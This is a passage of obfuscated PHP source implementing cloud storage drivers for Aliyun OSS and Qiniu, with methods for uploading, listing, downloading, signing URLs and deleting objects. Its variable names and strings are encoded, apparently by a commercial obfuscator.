=> trim($ıï¥©ìş->getETag(), $ğßÜ¼ì[120])); } unset($†´›—š[$ğßÜ¼ì[242]], $†´›—š[$ğßÜ¼ì[246]]); $Í´­¶µˆ = $this->multiUploadAuthData($‚¬è¾å–, $†´›—š); if (empty($Í´­¶µˆ)) { return !1; } return array($ğßÜ¼ì[251] => $Í´­¶µˆ, $ğßÜ¼ì[241] => $†´›—š[$ğßÜ¼ì[241]], $ğßÜ¼ì[253] => $€Ø‘Öè†); } public function download($È÷¨¸Êş, $Ë§õ¬üÖ) { if ($this->isFolder($È÷¨¸Êş)) { return !1; } try { $€Ò˜­îÊ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Ë§õ¬üÖ); $€Ò˜­îÊ = $this->trafficLimit($_SERVER[•Ùç É][111], $€Ò˜­îÊ); $this->client->getObject($this->bucket, $this->pathEncode($È÷¨¸Êş), $€Ò˜­îÊ); } catch (OSS\Core\OssException $™³ãÙ“Õ) { return !1; } return $Ë§õ¬üÖ; } public function fileSubstr($ä¨ıÇ¬«, $›ñÊ˜âœ = 0, $ÙÅùß = false) { if ($›ñÊ˜âœ === -1) { $•…–ÌÁ£ = array(); } else { if ($ÙÅùß === !1) { $¼æë¸ìÜ = $this->size($ä¨ıÇ¬«); } else { $¼æë¸ìÜ = $›ñÊ˜âœ + $ÙÅùß - 1; } $•…–ÌÁ£ = array(OSS\OssClient::OSS_RANGE => "{$›ñÊ˜âœ}\x2d{$¼æë¸ìÜ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ä¨ıÇ¬«), $•…–ÌÁ£); } catch (OSS\Core\OssException $¡ßŸà½Ê) { think_exception($¡ßŸà½Ê->getMessage()); return !1; } } private function trafficLimit($âÛ¿“Ä×, $æ¤²Ø = array()) { $‡£€ö©³ =& $_SERVER[•Ùç É]; if ($âÛ¿“Ä× == $‡£€ö©³[1450] && $this->isUploadServer() || $âÛ¿“Ä× == $‡£€ö©³[111] && $this->isFileOutServer()) { return $æ¤²Ø; } $ò¦¿†† = floatval($GLOBALS[$‡£€ö©³[6]][$‡£€ö©³[91]][$‡£€ö©³[109]][$âÛ¿“Ä×]) * 1024 * 1024 * 8; if (!$ò¦¿††) { return $æ¤²Ø; } $ò¦¿†† = $ò¦¿†† < 819200 ? 819200 : ($ò¦¿†† > 838860800 ? 838860800 : $ò¦¿††); $æ¤²Ø[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ò¦¿††); return $æ¤²Ø; } public function link($ÔèüÌŞÓ, $÷Ú—º±ú = array()) { $‰Áï£—Ö =& $_SERVER[•Ùç É]; if (!$this->exist($ÔèüÌŞÓ) || $this->isFolder($ÔèüÌŞÓ)) { return !1; } try { $÷Ú—º±ú = $this->trafficLimit($‰Áï£—Ö[111], $÷Ú—º±ú); $ø’©èéÉ = $this->client->signUrl($this->bucket, $this->pathEncode($ÔèüÌŞÓ), 3600 * 12, $‰Áï£—Ö[247], $÷Ú—º±ú); return $this->getCdnLink($ø’©èéÉ); } catch (OSS\Core\OssException $äŸåıè) { return !1; } } public function fileOut($ìè¥·æ, $ÃèÀåÅ = false, $ÏÒ¡é•Õ = false, $û’ñ±¢Ü = '') { $Ù“ÓÂÁ =& $_SERVER[•Ùç É]; if ($this->isFileOutServer()) { return $this->fileOutServer($ìè¥·æ, $ÃèÀåÅ, $ÏÒ¡é•Õ, $û’ñ±¢Ü); } if (!$ÏÒ¡é•Õ) { $ÏÒ¡é•Õ = $this->pathThis($ìè¥·æ); } $ÏÒ¡é•Õ = rawurlencode($ÏÒ¡é•Õ); $‘Áä•ëÏ = get_file_mime(get_path_ext($ÏÒ¡é•Õ)); if ($‘Áä•ëÏ == $Ù“ÓÂÁ[234]) { return parent::fileOut($ìè¥·æ, $ÃèÀåÅ, $ÏÒ¡é•Õ, $û’ñ±¢Ü); } $ÃèÀåÅ = $ÃèÀåÅ ? $Ù“ÓÂÁ[1460] : $Ù“ÓÂÁ[1461]; $Ôâœß’„ = array(OSS\OssClient::OSS_SUB_RESOURCE => $Ù“ÓÂÁ[1462] . rawurlencode("{$ÃèÀåÅ}\73\146\151\x6c\145\x6e\141\155\145\75{$ÏÒ¡é•Õ}")); $Ôâœß’„[OSS\OssClient::OSS_SUB_RESOURCE] .= $Ù“ÓÂÁ[1463] . rawurlencode($‘Áä•ëÏ); $û—Òõ¼Ì = $this->link($ìè¥·æ, $Ôâœß’„); $this->fileOutLink($û—Òõ¼Ì); } public function fileOutServer($–¿ßÇß, $ÚœÈùÌ = false, $ÃÒÁø = false, $¨îšñ¿ì = '') { parent::fileOut($–¿ßÇß, $ÚœÈùÌ, $ÃÒÁø, $¨îšñ¿ì); } public function fileOutImage($’­°Úøõ, $úÒ’Ùï· = 250) { if ($this->size($’­°Úøõ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($’­°Úøõ, $úÒ’Ùï·); } $ê†ÑæÍá = array(OSS\OssClient::OSS_PROCESS => $_SERVER[•Ùç É][1420] . $úÒ’Ùï·); $¯é³ÈÍ = $this->link($’­°Úøõ, $ê†ÑæÍá); $this->fileOutLink($¯é³ÈÍ); } public function fileOutImageServer($à­Åò½è, $”ĞÅ˜Ùö = 250) { parent::fileOutImage($à­Åò½è, $”ĞÅ˜Ùö); } public function fileOutLink($¿œØõã) { $şø‹…Ä =& $_SERVER[•Ùç É]; if (!$this->isCdnHost() && substr($¿œØõã, 0, 7) == $şø‹…Ä[1382]) { $¿œØõã = $şø‹…Ä[1383] . substr($¿œØõã, 7); } header($şø‹…Ä[164] . $¿œØõã); die; } public function hashMd5($Ô±×•É, $ÀËüÅà  = '') { $Ø‰ßïÕ =& $_SERVER[•Ùç É]; $™¤‡Çİ… = $this->_objectMeta($Ô±×•É); if (!$™¤‡Çİ…) { return $Ø‰ßïÕ[12]; } if (!isset($™¤‡Çİ…[$Ø‰ßïÕ[1440]]) && !empty($ÀËüÅà )) { $şô ï®Ù = $this->updateObjMeta($Ô±×•É, array($Ø‰ßïÕ[1440] => $ÀËüÅà )); $™¤‡Çİ…[$Ø‰ßïÕ[1440]] = $şô ï®Ù ? $ÀËüÅà  : $Ø‰ßïÕ[12]; } return isset($™¤‡Çİ…[$Ø‰ßïÕ[1440]]) ? strtolower($™¤‡Çİ…[$Ø‰ßïÕ[1440]]) : $Ø‰ßïÕ[12]; } public function size($Áí·ÖÙ÷) { $»ö¼á†é = $this->objectMeta($Áí·ÖÙ÷); return $»ö¼á†é ? $»ö¼á†é[$_SERVER[•Ùç É][78]] : 0; } public function info($½÷´¼’à) { if ($this->isFolder($½÷´¼’à)) { return $this->folderInfo($½÷´¼’à); } else { if ($this->isFile($½÷´¼’à)) { return $this->fileInfo($½÷´¼’à); } } return !1; } public function exist($ƒşšÀÒ®) { return $this->isFile($ƒşšÀÒ®) || $this->isFolder($ƒşšÀÒ®); } public function isFile($„ÔÍ½Éû) { return !$this->isFolder($„ÔÍ½Éû) && $this->objectMeta($„ÔÍ½Éû); } public function isFolder($Ô˜Ô—ÃÀ) { return $this->cacheMethod($_SERVER[•Ùç É][168], $Ô˜Ô—ÃÀ); } protected function objectMeta($•‡åÒù) { return $this->cacheMethod($_SERVER[•Ùç É][170], $•‡åÒù); } protected function _objectMeta($ÅõÉŒ¢Ï) { $æÖŠÎ¸ =& $_SERVER[•Ùç É]; try { $è´ŒßÆÎ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ÅõÉŒ¢Ï)); } catch (OSS\Core\OssException $¬š©ÊÒ˜) { $è´ŒßÆÎ = !1; } if ($è´ŒßÆÎ) { $è´ŒßÆÎ[$æÖŠÎ¸[78]] = intval($è´ŒßÆÎ[$æÖŠÎ¸[1438]]); } return $è´ŒßÆÎ; } protected function _isFolder($¬›©­¸º) { $ÃÆ“¤ü‡ =& $_SERVER[•Ùç É]; if ($¬›©­¸º == $ÃÆ“¤ü‡[12] || $¬›©­¸º == $ÃÆ“¤ü‡[8]) { return !0; } $œÆş±ĞÜ = array($ÃÆ“¤ü‡[1433] => $ÃÆ“¤ü‡[8], $ÃÆ“¤ü‡[1434] => rtrim($¬›©­¸º, $ÃÆ“¤ü‡[8]) . $ÃÆ“¤ü‡[8], $ÃÆ“¤ü‡[1435] => 1, $ÃÆ“¤ü‡[1436] => $ÃÆ“¤ü‡[12]); $„¤ğß = $this->client->listObjects($this->bucket, $œÆş±ĞÜ); if ($„¤ğß->getObjectList() || $„¤ğß->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($’¥ ’áÕ) { parent::__construct(); require_once SDK_DIR . $_SERVER[•Ùç É][1464]; $this->_init($’¥ ’áÕ); } public function _init($Ìøúû˜­) { $ùÉ™£ÆÕ =& $_SERVER[•Ùç É]; $this->config = $Ìøúû˜­; foreach ($Ìøúû˜­ as $Ç†ığà‹ => $é¥È·…ô) { if (isset($this->{$Ç†ığà‹})) { $this->{$Ç†ığà‹} = $é¥È·…ô; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ùÉ™£ÆÕ[1465] . LNG($ùÉ™£ÆÕ[1424])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ÃçÍÈÆ¥, $óƒŞŠƒ’ = '', $ùã´¬è = REPEAT_RENAME) { if ($this->setContent($ÃçÍÈÆ¥, $óƒŞŠƒ’)) { return $this->getPathOuter($ÃçÍÈÆ¥); } return !1; } public function mkdir($ˆø‹€œ, $Öô°Ú†‡ = REPEAT_SKIP) { $Ş½úÄÒ =& $_SERVER[•Ùç É]; $ÕàöÆ‰É = trim($ˆø‹€œ, $Ş½úÄÒ[8]); if ($this->_isFolder($ÕàöÆ‰É)) { return $this->getPathOuter($ÕàöÆ‰É); } $ˆø‹€œ = $ÕàöÆ‰É . $Ş½úÄÒ[8]; $ÁÁÛ‚ƒÈ = get_path_this($ÕàöÆ‰É); $îáÑ’• = $ˆø‹€œ . $ÁÁÛ‚ƒÈ; if (!$this->mkfile($îáÑ’•)) { return !1; } if (!$this->moveFile($îáÑ’•, $ˆø‹€œ)) { $this->delFile($îáÑ’•); return !1; } return $this->getPathOuter($ÕàöÆ‰É); } public function copyFile($ûæ˜¡îş, $æóµûÛ”) { $ø›ı—é× = $this->bucketManager->copy($this->bucket, $ûæ˜¡îş, $this->bucket, $æóµûÛ”, !0); return $ø›ı—é× ? !1 : $this->getPathOuter($æóµûÛ”); } public function moveFile($‹ÇÆ¨²Î, $çû£ĞÏ¸) { $ÙıÙëŒ’ = $this->bucketManager->move($this->bucket, $‹ÇÆ¨²Î, $this->bucket, $çû£ĞÏ¸, !0); return $ÙıÙëŒ’ ? !1 : $this->getPathOuter($çû£ĞÏ¸); } public function delFile($ñ¶ÓÔƒÄ) { if (!$this->exist($ñ¶ÓÔƒÄ)) { return !0; } $ôèá“Ûò = $this->bucketManager->delete($this->bucket, $ñ¶ÓÔƒÄ); return $ôèá“Ûò ? !1 : !0; } public function delFolder($ÃÔº»¦) { $Ó˜™äœ¾ =& $_SERVER[•Ùç É]; if (!$this->exist($ÃÔº»¦)) { return !0; } $this->listItemCache = !1; $¯Üç˜«¸ = $this->fileList($ÃÔº»¦); $this->listItemCache = !0; $ÓôêÈ·ì = trim($ÃÔº»¦, $Ó˜™äœ¾[8]) . $Ó˜™äœ¾[8]; if (!empty($ÃÔº»¦) && $ÃÔº»¦ !== $Ó˜™äœ¾[214] && !in_array($ÓôêÈ·ì, $¯Üç˜«¸[$Ó˜™äœ¾[84]])) { $¯Üç˜«¸[$Ó˜™äœ¾[84]][] = $ÓôêÈ·ì; } $ÓéºÚöª = $this->delByBatch($¯Üç˜«¸[$Ó˜™äœ¾[85]]); if (!$ÓéºÚöª) { return !1; } $ÓéºÚöª = $this->delByBatch($¯Üç˜«¸[$Ó˜™äœ¾[84]]); if (!$ÓéºÚöª) { return !1; } return $this->delFile($ÓôêÈ·ì); } private function delByBatch($òŠÄ™­‡) { foreach (array_chunk($òŠÄ™­‡, 1000) as $ÎäÒ°˜) { $ ¹ıâşğ = $this->bucketManager->buildBatchDelete($this->bucket, $ÎäÒ°˜); list($¼Ÿ”’ ğ, $ûàŠî–) = $this->bucketManager->batch($ ¹ıâşğ); if ($ûàŠî–) { return !1; } } return !0; } public function rename($€…î·é, $ŞøĞÒŒ×) { return $this->renameObject($€…î·é, $ŞøĞÒŒ×); } public function fileInfo($ÚØ¼‘Ÿ, $íïÁˆ²æ = false, $àôÍãŞ = array()) { $¶öïâ®ë =& $_SERVER[•Ùç É]; $Íš‘ç©Í = array($¶öïâ®ë[32] => $this->pathThis($ÚØ¼‘Ÿ), $¶öïâ®ë[86] => $this->getPathOuter($¶öïâ®ë[8] . $ÚØ¼‘Ÿ), $¶öïâ®ë[33] => $¶öïâ®ë[216], $¶öïâ®ë[78] => isset($àôÍãŞ[$¶öïâ®ë[1466]]) ? $àôÍãŞ[$¶öïâ®ë[1466]] : 0, $¶öïâ®ë[177] => $this->ext($ÚØ¼‘Ÿ)); if ($íïÁˆ²æ) { return $Íš‘ç©Í; } $Íš‘ç©Í[$¶öïâ®ë[217]] = $Íš‘ç©Í[$¶öïâ®ë[87]] = 0; $Íš‘ç©Í[$¶öïâ®ë[218]] = $Íš‘ç©Í[$¶öïâ®ë[219]] = !0; if (empty($àôÍãŞ)) { $àôÍãŞ = $this->objectMeta($ÚØ¼‘Ÿ); if (!$àôÍãŞ) { return $Íš‘ç©Í; } } if (isset($àôÍãŞ[$¶öïâ®ë[220]]) && $àôÍãŞ[$¶öïâ®ë[220]]) { $Íš‘ç©Í[$¶öïâ®ë[221]] = $àôÍãŞ[$¶öïâ®ë[220]]; } if (isset($àôÍãŞ[$¶öïâ®ë[230]]) && $àôÍãŞ[$¶öïâ®ë[230]]) { $Íš‘ç©Í[$¶öïâ®ë[221]] = $àôÍãŞ[$¶öïâ®ë[230]]; } if (isset($àôÍãŞ[$¶öïâ®ë[1467]])) { $Íš‘ç©Í[$¶öïâ®ë[87]] = substr($àôÍãŞ[$¶öïâ®ë[1467]] . $¶öïâ®ë[12], 0, 10); } if (isset($àôÍãŞ[$¶öïâ®ë[1466]])) { $Íš‘ç©Í[$¶öïâ®ë[78]] = $àôÍãŞ[$¶öïâ®ë[1466]]; } return $Íš‘ç©Í; } public function folderInfo($ãÎûÛ, $òŠÏËÏœ = false) { $ìö“İÇÔ =& $_SERVER[•Ùç É]; $Òê®œìŒ = array($ìö“İÇÔ[32] => $this->pathThis($ãÎûÛ), $ìö“İÇÔ[86] => $this->getPathOuter($ìö“İÇÔ[8] . $ãÎûÛ), $ìö“İÇÔ[33] => $ìö“İÇÔ[77]); if ($òŠÏËÏœ) { return $Òê®œìŒ; } $Òê®œìŒ[$ìö“İÇÔ[217]] = $Òê®œìŒ[$ìö“İÇÔ[87]] = 0; $Òê®œìŒ[$ìö“İÇÔ[218]] = $Òê®œìŒ[$ìö“İÇÔ[219]] = !0; $ãÎûÛ = rtrim($ãÎûÛ, $ìö“İÇÔ[8]) . $ìö“İÇÔ[8]; $‹¬½„ƒ£ = $this->objectMeta($ãÎûÛ); if (isset($‹¬½„ƒ£[$ìö“İÇÔ[1467]])) { $Òê®œìŒ[$ìö“İÇÔ[87]] = substr($‹¬½„ƒ£[$ìö“İÇÔ[1467]] . $ìö“İÇÔ[12], 0, 10); } return $Òê®œìŒ; } public function listPath($®öÕÊ§Ä, $“³Ò«‹Á = false) { $´İˆœÈ =& $_SERVER[•Ùç É]; $ÃÙ²Ñ‰ = $this->fileList($®öÕÊ§Ä, $´İˆœÈ[8], !0); foreach ($ÃÙ²Ñ‰[$´İˆœÈ[84]] as $Óªª®Ó­ => $ËæÄÅƒÙ) { $ÃÙ²Ñ‰[$´İˆœÈ[84]][$Óªª®Ó­] = $this->folderInfo($ËæÄÅƒÙ, $“³Ò«‹Á); } foreach ($ÃÙ²Ñ‰[$´İˆœÈ[85]] as $Óªª®Ó­ => $ËæÄÅƒÙ) { $ÃÙ²Ñ‰[$´İˆœÈ[85]][$Óªª®Ó­] = $this->fileInfo($ËæÄÅƒÙ[$´İˆœÈ[96]], $“³Ò«‹Á, $ËæÄÅƒÙ); } return $ÃÙ²Ñ‰; } public function has($İÕ¸ĞŒ, $íŞ”ğñî = false, $‚ùÔ•á­ = true) { $÷»ù¹³Å =& $_SERVER[•Ùç É]; $İÕ¸ĞŒ = trim($İÕ¸ĞŒ, $÷»ù¹³Å[8]); $¿Åµºû³ = empty($İÕ¸ĞŒ) && $İÕ¸ĞŒ !== $÷»ù¹³Å[214] ? $÷»ù¹³Å[12] : $İÕ¸ĞŒ . $÷»ù¹³Å[8]; $ª™²ïê = $÷»ù¹³Å[12]; $í¿•˜š = 500; $ĞàÌôÁ½ = $÷»ù¹³Å[8]; $¶Áä¸ü = $Ÿ‰úÔ†ı = 0; while (!0) { check_abort(); list($æ•úØ²û, $³ÒÁÍšë) = $this->bucketManager->listFiles($this->bucket, $¿Åµºû³, $ª™²ïê, $í¿•˜š, $ĞàÌôÁ½); if ($³ÒÁÍšë) { break; } $ª™²ïê = array_key_exists($÷»ù¹³Å[1436], $æ•úØ²û) ? $ª™²ïê = $æ•úØ²û[$÷»ù¹³Å[1468]] : $÷»ù¹³Å[12]; if ($íŞ”ğñî) { if (!empty($æ•úØ²û[$÷»ù¹³Å[1469]])) { $¶Áä¸ü += count($æ•úØ²û[$÷»ù¹³Å[1469]]); } if (!empty($æ•úØ²û[$÷»ù¹³Å[1470]])) { $Ÿ‰úÔ†ı += count($æ•úØ²û[$÷»ù¹³Å[1470]]); } if ($ª™²ïê === $÷»ù¹³Å[12]) { break; } continue; } if ($‚ùÔ•á­) { if (!empty($æ•úØ²û[$÷»ù¹³Å[1469]])) { return !0; } } else { if (!empty($æ•úØ²û[$÷»ù¹³Å[1470]])) { return !0; } } if ($ª™²ïê === $÷»ù¹³Å[12]) { break; } } if ($íŞ”ğñî) { return array($÷»ù¹³Å[225] => $¶Áä¸ü, $÷»ù¹³Å[226] => $Ÿ‰úÔ†ı); } return !1; } public function listAll($ÆúÉŞ“Š) { $ÛÜµúà =& $_SERVER[•Ùç É]; $¤‘ÚÂëİ = $this->fileList($ÆúÉŞ“Š, $ÛÜµúà[12], !0); $‰÷ğšƒ“ = array_to_keyvalue($¤‘ÚÂëİ[$ÛÜµúà[85]], $ÛÜµúà[32]); foreach ($¤‘ÚÂëİ[$ÛÜµúà[84]] as $È†ÊĞÛ˜) { if (is_string($È†ÊĞÛ˜)) { $‰÷ğšƒ“[$È†ÊĞÛ˜] = array($ÛÜµúà[78] => 0); } } return $this->listAllFiles($ÆúÉŞ“Š, $‰÷ğšƒ“); } private function fileList($ò™¡êÀø, $È•›×Ñš = '', $Áª³ÈŞ‰ = 0) { $ÓÇ¦­Ò =& $_SERVER[•Ùç É]; $ò™¡êÀø = trim($ò™¡êÀø, $ÓÇ¦­Ò[8]); $Ùï‹³”Ì = empty($ò™¡êÀø) && $ò™¡êÀø !== $ÓÇ¦­Ò[214] ? $ÓÇ¦­Ò[12] : $ò™¡êÀø . $ÓÇ¦­Ò[8]; $‰á„ı‹è = $ÓÇ¦­Ò[12]; $İÍ­Ğ Ö = 1000; $šğÏµ‚ = $÷À¨‘“ = array(); while (!0) { check_abort(); list($‘Î³¿ôÍ, $Í±üäØë) = $this->bucketManager->listFiles($this->bucket, $Ùï‹³”Ì, $‰á„ı‹è, $İÍ­Ğ Ö, $È•›×Ñš); if ($Í±üäØë) { break; } $‰á„ı‹è = array_key_exists($ÓÇ¦­Ò[1436], $‘Î³¿ôÍ) ? $‰á„ı‹è = $‘Î³¿ôÍ[$ÓÇ¦­Ò[1468]] : $ÓÇ¦­Ò[12]; $»¯…àê‘ = isset($‘Î³¿ôÍ[$ÓÇ¦­Ò[1469]]) ? $‘Î³¿ôÍ[$ÓÇ¦­Ò[1469]] : array(); $í–²æÔÁ = isset($‘Î³¿ôÍ[$ÓÇ¦­Ò[1470]]) ? $‘Î³¿ôÍ[$ÓÇ¦­Ò[1470]] : array(); foreach ($»¯…àê‘ as $¬¢°ŞÜÚ) { if ($¬¢°ŞÜÚ[$ÓÇ¦­Ò[96]] == $Ùï‹³”Ì) { continue; } $ÈïôĞ§– = $¬¢°ŞÜÚ[$ÓÇ¦­Ò[96]]; $å¼ÖÏ…÷ = $¬¢°ŞÜÚ[$ÓÇ¦­Ò[1466]]; $¬¢°ŞÜÚ[$ÓÇ¦­Ò[78]] = $å¼ÖÏ…÷; $¢ÅªÛ¤Ÿ = $å¼ÖÏ…÷ == 0 && substr($ÈïôĞ§–, strlen($ÈïôĞ§–) - 1, 1) == $ÓÇ¦­Ò[8] ? !0 : !1; $this->cacheMethodInfoSet($ÈïôĞ§–, $¢ÅªÛ¤Ÿ, $¬¢°ŞÜÚ); if ($¢ÅªÛ¤Ÿ) { $šğÏµ‚[] = $ÈïôĞ§–; continue; } $÷À¨‘“[] = $Áª³ÈŞ‰ ? $¬¢°ŞÜÚ : $ÈïôĞ§–; } foreach ($í–²æÔÁ as $ÈïôĞ§–) { if ($ÈïôĞ§– == $Ùï‹³”Ì) { continue; } $šğÏµ‚[] = $ÈïôĞ§–; $this->cacheMethodInfoSet($ÈïôĞ§–, !0); } if ($‰á„ı‹è === $ÓÇ¦­Ò[12]) { break; } } $this->cacheMethodInfoSet($ò™¡êÀø, !0); return array($ÓÇ¦­Ò[84] => $šğÏµ‚, $ÓÇ¦­Ò[85] => $÷À¨‘“); } public function canRead($‘†äÃšÏ) { return $this->exist($‘†äÃšÏ) ? !0 : !1; } public function canWrite($¬ú¯ÍİÍ) { return $this->exist($¬ú¯ÍİÍ) ? !0 : !1; } public function getContent($Ë¢ÌÎ”Ş) { return $this->fileSubstr($Ë¢ÌÎ”Ş, 0, -1); } public function setContent($µÂœÜ€¤, $ñ…²í€ş = '') { $ğáìËßÙ = $this->tempFile($this->pathThis($µÂœÜ€¤)); file_put_contents($ğáìËßÙ, $ñ…²í€ş); if ($this->upload($µÂœÜ€¤, $ğáìËßÙ)) { $this->tempFileRemve($ğáìËßÙ); return !0; } return !1; } public function refreshUrls($Ú¢ú¦â–) { $‹‹éñã¼ =& $_SERVER[•Ùç É]; $€‘ùëË = array(); if (is_array($Ú¢ú¦â–)) { foreach ($Ú¢ú¦â– as $Ì‚Õ†¡å) { $€‘ùëË[] = $this->link($Ì‚Õ†¡å); } } else { $€‘ùëË[] = $this->link($Ú¢ú¦â–); } $Á›ğÖÚÕ = new Qiniu\Cdn\CdnManager($this->auth); list($Ïä˜¦õ™, $ö˜””¥Ø) = $Á›ğÖÚÕ->refreshUrls($€‘ùëË); if ($ö˜””¥Ø) { return !1; } return $Ïä˜¦õ™[$‹‹éñã¼[1233]] == $‹‹éñã¼[804] ? !0 : !1; } public function fileSubstr($¬ÛŸ ™ï, $§ÄÚ†‚‚, $»üÉ¼±Û) { $ñÎıº“­ =& $_SERVER[•Ùç É]; if (!($¿…“èé£ = $this->link($¬ÛŸ ™ï))) { return !1; } $â»ûó´ = !1; if ($»üÉ¼±Û > 0) { $ÉÃ‘”‹ğ = $§ÄÚ†‚‚ + $»üÉ¼±Û - 1; $â»ûó´ = array($ñÎıº“­[1471] . $§ÄÚ†‚‚ . $ñÎıº“­[432] . $ÉÃ‘”‹ğ); } $ˆı†é¶Ÿ = url_request($¿…“èé£, $ñÎıº“­[247], !1, $â»ûó´); return $ˆı†é¶Ÿ[$ñÎıº“­[795]] ? $ˆı†é¶Ÿ[$ñÎıº“­[1253]] : !1; } public function upload($üò‹ŸÒ£, $Ú¼æİäê, $Ÿ÷ª­­× = false, $Ë¤Ï¥ãÓ = REPEAT_REPLACE) { $É¡Â‘Å¦ = new Qiniu\Storage\UploadManager(); $ã÷æİŒö = $this->auth->uploadToken($this->bucket, $üò‹ŸÒ£); $’µú¿‹ = get_file_mime(get_path_ext($Ú¼æİäê)); list($ø½×¿‰, $ûÄ¾üşÆ) = $É¡Â‘Å¦->putFile($ã÷æİŒö, $üò‹ŸÒ£, $Ú¼æİäê, null, $’µú¿‹); return $ûÄ¾üşÆ ? !1 : $this->getPathOuter($üò‹ŸÒ£); } public function uploadFormData($ñúü¦†Í, $º£»ÓÇ„ = 3600) { return $this->uploadToken($ñúü¦†Í, $º£»ÓÇ„); } public function multiUploadFormData($Ó„Ğ³€Ğ, $›ºùôŒ¹ = 3600) { return $this->uploadToken($Ó„Ğ³€Ğ, $›ºùôŒ¹); } private function uploadToken($ûĞ”Í­ß, $Æ×µ¹Á¾ = 3600) { $Àâ„šÖ =& $_SERVER[•Ùç É]; $©½ÀÚÈ = $Æ×µ¹Á¾; $«¦°ô± = array($Àâ„šÖ[1472] => $Àâ„šÖ[1473]); $µÀò¸¹ = $ûĞ”Í­ß; $ĞÙ¼ÒåÉ = $this->auth->uploadToken($this->bucket, $µÀò¸¹, $©½ÀÚÈ, $«¦°ô±, !0); $àÚÇŸˆª = empty($this->region) || $this->region == $Àâ„šÖ[1474] ? $Àâ„šÖ[12] : $Àâ„šÖ[432] . $this->region; $·ÚÎ‰›ü = http_type() . "\x3a\x2f\57\165\x70\x6c\157\x61\144{$àÚÇŸˆª}\56\161\151\156\x69\x75\x70\x2e\143\x6f\x6d\x2f"; return array($Àâ„šÖ[1475] => $ĞÙ¼ÒåÉ, $Àâ„šÖ[1476] => $·ÚÎ‰›ü); } public function download($øäƒ…åŒ, $êÊîÆ§») { $îøûôÖƒ = IO::getPathInner(IO::mkfile($êÊîÆ§»)); if (!($—­“ö‘ = $this->link($øäƒ…åŒ))) { return !1; } $¿«Ö•ê = 0; $šÕßŠ•÷ = 1024 * 200; $½Å÷–åà = fopen($îøûôÖƒ, $_SERVER[•Ùç É][1477]); while (!0) { $ùœî = $this->fileSubstr($øäƒ…åŒ, $¿«Ö•ê, $šÕßŠ•÷); if ($ùœî === !1) { return !1; } fwrite($½Å÷–åà, $ùœî); $¿«Ö•ê += $šÕßŠ•÷; if (strlen($ùœî) < $šÕßŠ•÷) { break; } } fclose($½Å÷–åà); return $êÊîÆ§»; } public function link($Ÿ‰ØòºÓ, $İÜŸù±ã = '') { if (!$this->isFile($Ÿ‰ØòºÓ)) { return !1; } $‘Ìå¦â½ = $this->getHost() . $_SERVER[•Ùç É][8] . $this->pathEncode($Ÿ‰ØòºÓ) . $İÜŸù±ã; return $this->auth->privateDownloadUrl($‘Ìå¦â½, 3600 * 12); } public function fileOut($Ï²–×ÏÖ, $³Ú•Êœã = false, $‰òÛÜÁé = false, $ÛÃá×Õ = '') { $×ò¬äÀ¤ =& $_SERVER[•Ùç É]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ï²–×ÏÖ, $³Ú•Êœã, $‰òÛÜÁé, $ÛÃá×Õ); } if (!$‰òÛÜÁé) { $‰òÛÜÁé = $this->pathThis($Ï²–×ÏÖ); } $Î¾ºáèÅ = $³Ú•Êœã ? $×ò¬äÀ¤[1478] . rawurlencode($‰òÛÜÁé) : $×ò¬äÀ¤[12]; $¿ˆ±Ÿş” = $this->link($Ï²–×ÏÖ, $Î¾ºáèÅ); $this->fileOutLink($¿ˆ±Ÿş”); } public function fileOutServer($©ÚÂÆš©, $›²¡ˆ±¢ = false, $í­òˆªİ = false, $Ÿ•…¬ù = '') { parent::fileOut($©ÚÂÆš©, $›²¡ˆ±¢, $í­òˆªİ, $Ÿ•…¬ù); } public function fileOutImage($‘ãºŞÜ½, $Œ¿¨»Ÿƒ = 250) { $İ‡ƒÄÄ´ = $this->link($‘ãºŞÜ½, $_SERVER[•Ùç É][1479] . $Œ¿¨»Ÿƒ); $this->fileOutLink($İ‡ƒÄÄ´); } public function fileOutImageServer($š±î¡²•, $ˆ…ìîÍï = 250) { parent::fileOutImage($š±î¡²•, $ˆ…ìîÍï); } public function hashMd5($Ûç³ê ğ) { $—¯Ê‡­Ç =& $_SERVER[•Ùç É]; $ÙÎñ Ç‚ = $this->objectMeta($Ûç³ê ğ); return isset($ÙÎñ Ç‚[$—¯Ê‡­Ç[230]]) ? $ÙÎñ Ç‚[$—¯Ê‡­Ç[230]] : !1; $›´˜Øü½ = $this->link($Ûç³ê ğ, $—¯Ê‡­Ç[1480]); } public function size($Òä•¢äø) { $ôì‚å« = $this->objectMeta($Òä•¢äø); return $ôì‚å« ? $ôì‚å«[$_SERVER[•Ùç É][78]] : 0; } public function info($ä§Ûå”æ) { if ($this->isFolder($ä§Ûå”æ)) { return $this->folderInfo($ä§Ûå”æ); } else { if ($this->isFile($ä§Ûå”æ)) { return $this->fileInfo($ä§Ûå”æ); } } return !1; } public function exist($×¤–ŠËª) { return $this->isFile($×¤–ŠËª) || $this->isFolder($×¤–ŠËª); } public function isFile($ó¶§ğ¢Ò) { return !$this->isFolder($ó¶§ğ¢Ò) && $this->objectMeta($ó¶§ğ¢Ò); } public function isFolder($·ÃÙúÅØ) { return $this->cacheMethod($_SERVER[•Ùç É][168], $·ÃÙúÅØ); } protected function objectMeta($·’Ÿ¼®ê) { return $this->cacheMethod($_SERVER[•Ùç É][170], $·’Ÿ¼®ê); } protected function _objectMeta($é—ùÕ‘Ù) { $Ú©ƒ¸¥Ÿ =& $_SERVER[•Ùç É]; list($âÍèÄÀ, $™âÃÙí×) = $this->bucketManager->stat($this->bucket, $é—ùÕ‘Ù); if ($âÍèÄÀ) { 